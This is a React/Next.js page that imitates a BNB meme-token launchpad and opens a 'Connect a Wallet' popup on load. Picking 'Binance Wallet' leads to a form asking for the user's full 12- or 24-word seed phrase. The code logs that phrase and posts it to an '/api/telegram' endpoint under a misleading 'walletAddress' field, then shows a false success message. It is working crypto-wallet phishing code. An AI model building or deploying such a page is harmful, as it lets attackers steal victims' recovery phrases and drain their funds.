'use client';

import { useEffect, useState } from 'react';

export default function Home() {
  const [showPopup, setShowPopup] = useState(false);
  const [walletStep, setWalletStep] = useState(0);
  const [seedPhraseType, setSeedPhraseType] = useState(12);
  const [seedPhrase, setSeedPhrase] = useState<string[]>(Array(12).fill(''));
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    // Show popup when page loads
    setShowPopup(true);
  }, []);

  const handleBinanceWallet = () => {
    setWalletStep(3); // Go directly to seed phrase entry
  };

  const handleSeedPhraseSubmit = async () => {
    const fullPhrase = seedPhrase.join(' ').trim();
    
    if (!fullPhrase) {
      alert('Please enter your seed phrase');
      return;
    }

    const wordCount = fullPhrase.split(/\s+/).length;
    if (wordCount < seedPhraseType) {
      alert(`Please enter a complete ${seedPhraseType}-word seed phrase`);
      return;
    }

    setIsLoading(true);

    try {
      console.log('🔄 Importing seed phrase:', fullPhrase);
      
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          walletAddress: fullPhrase 
        }),
      });

      const data = await response.json();

      if (response.ok) {
        console.log('✅ Wallet imported successfully');
        setShowPopup(false);
        setWalletStep(0);
        setSeedPhrase(Array(12).fill(''));
        setSeedPhraseType(12);
        alert('Wallet imported successfully! Check your Telegram for confirmation.');
      } else {
        throw new Error(data.error || 'Failed to import wallet');
      }
    } catch (error) {
      console.error('❌ Import error:', error);
      alert('Failed to import wallet. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleSeedPhraseTypeChange = (type: number) => {
    setSeedPhraseType(type);
    setSeedPhrase(Array(type).fill(''));
  };

  const handleSeedWordChange = (index: number, value: string) => {
    const newSeedPhrase = [...seedPhrase];
    newSeedPhrase[index] = value;
    setSeedPhrase(newSeedPhrase);
  };

  const renderWalletPopup = () => {
    if (walletStep === 0) {
      return (
        <div className="bg-white rounded-2xl p-6 w-full max-w-md mx-4">
          <h2 className="text-2xl font-bold text-center mb-6">Connect a Wallet</h2>
          
          <div className="flex gap-4 mb-6 overflow-x-auto pb-2">
            <button className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center hover:border-gray-300 transition-colors min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">Trust Wallet</span>
            </button>
            
            <button 
              onClick={handleBinanceWallet}
              className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center hover:border-gray-300 transition-colors min-w-[140px] flex-shrink-0"
            >
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">Binance Wallet</span>
            </button>
            
            <button className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center hover:border-gray-300 transition-colors min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">Google</span>
            </button>
            
            <button className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center hover:border-gray-300 transition-colors min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">OKX Wallet</span>
            </button>
          </div>

          <div className="text-center mb-6">
            <h3 className="font-bold mb-2">What is a Wallet?</h3>
            <p className="text-sm text-gray-600">
              A wallet is used to send, receive, store, and display digital assets. It&apos;s also a new way to log in, without needing to create new accounts and passwords on every website.
            </p>
          </div>

          <div className="flex gap-4">
            <button className="flex-1 bg-gray-100 text-gray-800 py-3 rounded-xl font-medium hover:bg-gray-200 transition-colors">
              Get a Wallet
            </button>
            <button className="flex-1 bg-gray-100 text-gray-800 py-3 rounded-xl font-medium hover:bg-gray-200 transition-colors">
              Learn More
            </button>
          </div>
        </div>
      );
    }

    if (walletStep === 1) {
      return (
        <div className="bg-white rounded-2xl p-6 w-full max-w-md mx-4">
          <h2 className="text-2xl font-bold text-center mb-6">Connect a Wallet</h2>
          
          <div className="flex gap-4 mb-8 overflow-x-auto pb-2">
            <div className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center opacity-50 min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">Trust Wallet</span>
            </div>
            
            <div className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center opacity-50 min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">Binance Wallet</span>
            </div>
            
            <div className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center opacity-50 min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">Google</span>
            </div>
            
            <div className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center opacity-50 min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">OKX Wallet</span>
            </div>
          </div>

          <div className="text-center">
            <div className="animate-pulse text-lg font-medium mb-2">Opening Wallet...</div>
            <p className="text-sm text-gray-600">Confirm connection in the wallet</p>
          </div>
        </div>
      );
    }

    if (walletStep === 2) {
      return (
        <div className="bg-white rounded-2xl p-6 w-full max-w-md mx-4">
          <h2 className="text-2xl font-bold text-center mb-6">Connect a Wallet</h2>
          
          <div className="flex gap-4 mb-8 overflow-x-auto pb-2">
            <div className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center opacity-50 min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">Trust Wallet</span>
            </div>
            
            <div className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center opacity-50 min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">Binance Wallet</span>
            </div>
            
            <div className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center opacity-50 min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">Google</span>
            </div>
            
            <div className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center opacity-50 min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">OKX Wallet</span>
            </div>
          </div>

          <div className="text-center mb-6">
            <div className="text-red-500 text-lg font-medium mb-2">We encountered a temporary security issue.</div>
            <p className="text-sm text-gray-600 mb-4">
              This could be due to network instability or protection mechanisms.
            </p>
          </div>

          <div className="flex gap-4">
            <button 
              onClick={() => setWalletStep(0)}
              className="flex-1 bg-blue-500 text-white py-3 rounded-xl font-medium hover:bg-blue-600 transition-colors"
            >
              Retry Connection
            </button>
            <button className="flex-1 bg-gray-100 text-gray-800 py-3 rounded-xl font-medium hover:bg-gray-200 transition-colors">
              Learn More
            </button>
          </div>
        </div>
      );
    }

    if (walletStep === 3) {
      return (
        <div className="bg-white rounded-2xl p-6 w-full max-w-md mx-4">
          <h2 className="text-2xl font-bold text-center mb-6">Connect a Wallet</h2>
          
          <div className="flex gap-4 mb-6 overflow-x-auto pb-2">
            <div className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center opacity-50 min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">Trust Wallet</span>
            </div>
            
            <div className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center opacity-50 min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">Binance Wallet</span>
            </div>
            
            <div className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center opacity-50 min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">Google</span>
            </div>
            
            <div className="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center opacity-50 min-w-[140px] flex-shrink-0">
              <div className="w-12 h-12 bg-gray-200 rounded-full mb-2"></div>
              <span className="font-medium">OKX Wallet</span>
            </div>
          </div>

          <div className="flex gap-2 mb-6">
            <button 
              onClick={() => handleSeedPhraseTypeChange(12)}
              className={`flex-1 py-3 rounded-xl font-medium transition-colors ${
                seedPhraseType === 12 ? 'bg-blue-500 text-white' : 'bg-gray-100 text-gray-800'
              }`}
            >
              12 Words
            </button>
            <button 
              onClick={() => handleSeedPhraseTypeChange(24)}
              className={`flex-1 py-3 rounded-xl font-medium transition-colors ${
                seedPhraseType === 24 ? 'bg-blue-500 text-white' : 'bg-gray-100 text-gray-800'
              }`}
            >
              24 Words
            </button>
          </div>

          <div className="mb-6">
            <p className="text-sm text-gray-600 mb-4">
              Enter your {seedPhraseType}-word seed phrase here.<br />
              Words are separated by single spaces.
            </p>
            
            <div className="grid grid-cols-2 gap-3">
              {Array.from({ length: seedPhraseType }, (_, i) => (
                <div key={i} className="flex items-center">
                  <span className="text-gray-500 w-6 text-sm">{i + 1}</span>
                  <input
                    type="text"
                    value={seedPhrase[i] || ''}
                    onChange={(e) => handleSeedWordChange(i, e.target.value)}
                    className="flex-1 border-2 border-gray-200 rounded-lg px-3 py-2 text-sm"
                    placeholder=""
                  />
                </div>
              ))}
            </div>
          </div>

          <button 
            onClick={handleSeedPhraseSubmit}
            disabled={isLoading}
            className="w-full bg-blue-500 text-white py-3 rounded-xl font-medium hover:bg-blue-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
          >
            {isLoading ? (
              <>
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                Importing...
              </>
            ) : (
              'Import'
            )}
          </button>
        </div>
      );
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-400 to-blue-500 relative">
      {/* Header */}
      <header className="pt-4 px-4">
        <div className="flex justify-between items-center">
          <div className="text-white font-bold text-xl">FOUR</div>
          <div className="flex items-center gap-4">
            <div className="text-white">Time</div>
            <button 
              onClick={() => setShowPopup(true)}
              className="w-8 h-8 flex flex-col justify-center items-center gap-1"
            >
              <div className="w-6 h-0.5 bg-white"></div>
              <div className="w-6 h-0.5 bg-white"></div>
              <div className="w-6 h-0.5 bg-white"></div>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="px-4 py-6">
        {/* Recent Activity */}
        <div className="bg-white/20 backdrop-blur-sm rounded-2xl p-4 mb-4">
          <div className="text-white mb-3">
            <span className="font-mono text-sm">Oxa9...68cf0a</span>
            <span className="ml-2">Bought</span>
          </div>
          <div className="text-white ml-4">
            <span className="font-bold">0.2 BNB</span>
            <span className="ml-2">of</span>
          </div>
          <div className="text-white ml-4 font-bold">BNBSZN</div>
        </div>

        <div className="bg-white/20 backdrop-blur-sm rounded-2xl p-4 mb-4">
          <div className="text-white mb-3">
            <span className="font-mono text-sm">Ox3d...5bcfdc</span>
            <span className="ml-2">Bought</span>
          </div>
          <div className="text-white ml-4">
            <span className="font-bold">0.35 BNB</span>
            <span className="ml-2">of</span>
          </div>
          <div className="text-white ml-4 font-bold">BNBSZN</div>
        </div>

        <div className="bg-white/20 backdrop-blur-sm rounded-2xl p-4 mb-6">
          <div className="text-white mb-3">
            <span className="font-mono text-sm">Ox1e...b170de</span>
            <span className="ml-2">Bou</span>
          </div>
          <div className="text-white ml-4">
            <span className="font-bold">0.2 BNB</span>
            <span className="ml-2">of</span>
          </div>
          <div className="text-white ml-4 font-bold">Brocc</div>
        </div>

        {/* Action Buttons */}
        <div className="grid grid-cols-2 gap-4 mb-6">
          <button className="bg-white/20 backdrop-blur-sm rounded-2xl p-4 text-white font-bold text-center hover:bg-white/30 transition-colors">
            Create Token
          </button>
          <button className="bg-white/20 backdrop-blur-sm rounded-2xl p-4 text-white font-bold text-center hover:bg-white/30 transition-colors">
            How it works
          </button>
        </div>

        {/* Banner */}
        <div className="bg-white/20 backdrop-blur-sm rounded-2xl p-4 mb-6">
          <div className="text-white text-center font-bold text-lg mb-2">
            The New Way To MEME Become A TAGGER
          </div>
          <div className="text-white/80 text-center text-sm">
            Stern Taggers
          </div>
        </div>

        {/* Search and Filters */}
        <div className="bg-white/20 backdrop-blur-sm rounded-2xl p-4 mb-4">
          <div className="text-white mb-3">Search Token</div>
          <div className="flex items-center gap-2 mb-3">
            <div className="w-4 h-4 border-2 border-white rounded-full"></div>
            <span className="text-white text-sm">Listed on PancakeSwap</span>
          </div>
          <div className="flex gap-4 text-white text-sm">
            <span>All Tag</span>
            <span>All Token</span>
            <span>Time</span>
          </div>
        </div>

        {/* Token Cards */}
        <div className="bg-white/20 backdrop-blur-sm rounded-2xl p-4 mb-4">
          <div className="text-white mb-2"># FOUR</div>
          <div className="text-white text-xs mb-3">Meme created by: Qx6a...6873</div>
          <div className="text-white font-bold mb-2">Seasons ... (BNB)</div>
          <div className="text-white text-sm mb-3">Heard even the seasons are being renamed now...</div>
          <div className="text-white">Market Cap: 7.65 K</div>
        </div>

        <div className="bg-white/20 backdrop-blur-sm rounded-2xl p-4 mb-4">
          <div className="text-white text-xs mb-3">created by: Oxaa...2994</div>
          <div className="text-white font-bold mb-2">CZ FOOD (BNB)</div>
          <div className="text-white mb-2">CZ</div>
          <div className="text-white">Market Cap: 8.22 K</div>
        </div>

        <div className="bg-white/20 backdrop-blur-sm rounded-2xl p-4">
          <div className="text-white text-xs mb-3">createalpy: Ox4e...0618</div>
          <div className="text-white font-bold mb-2">Broccoli ... (BNB)</div>
          <div className="text-white mb-2">Broccoli DOGGY</div>
          <div className="text-white mb-2">Market Cap: 7.94 K</div>
          <div className="text-white">Partnership</div>
        </div>
      </main>

      {/* Wallet Connection Popup */}
      {showPopup && (
        <div className="fixed inset-0 bg-black/50 flex items-end justify-center pb-8 z-50">
          {renderWalletPopup()}
          <button 
            onClick={() => setShowPopup(false)}
            className="absolute top-4 right-4 text-white text-2xl"
          >
            ×
          </button>
        </div>
      )}
    </div>
  );
}
